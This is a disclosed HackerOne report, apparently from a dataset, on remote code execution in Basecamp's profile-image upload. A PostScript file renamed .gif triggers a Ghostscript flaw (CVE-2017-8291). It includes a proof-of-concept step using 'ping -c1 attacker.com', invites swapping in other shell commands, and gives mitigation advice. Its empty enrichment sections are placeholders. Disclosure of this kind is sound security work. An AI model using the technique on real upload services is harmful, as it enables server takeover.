---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '365271'
original_report_id: '365271'
title: Remote code execution on Basecamp.com
weakness: Command Injection - Generic
team_handle: basecamp
created_at: '2018-06-13T07:27:51.328Z'
disclosed_at: '2020-11-26T18:22:15.199Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 409
asset_identifier: basecamp.com
asset_type: URL
max_severity: none
tags:
- hackerone
- command-injection-generic
---

# Remote code execution on Basecamp.com

## Metadata

- HackerOne Report ID: 365271
- Weakness: Command Injection - Generic
- Program: basecamp
- Disclosed At: 2020-11-26T18:22:15.199Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

A critical flaw in Basecamp's profile image upload function leads to remote command execution. Images are converted on the server side, but not only image files but also PostScript/EPS files are accepted (if renamed to .gif). This is probably due to ImageMagick / GraphicsMagick being used for image conversion, which calls a PostScript interpreter (Ghostscript) if the input file starts with '%!'. The used Ghostscript version however has a security bug (CVE-2017-8291) leading to remote command execution.

/Proof of concept/: Upload the attached rce.gif file as profile image (change the `ping -c1 attacker.com' to some other shell command).

/Mitigation/: Upgrade Ghostscript; also, before processing uploaded images make sure they are real image files (e.g. based on magic header)

## Impact

Gain a remote shell; from here start exploitation/privilege escalation

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
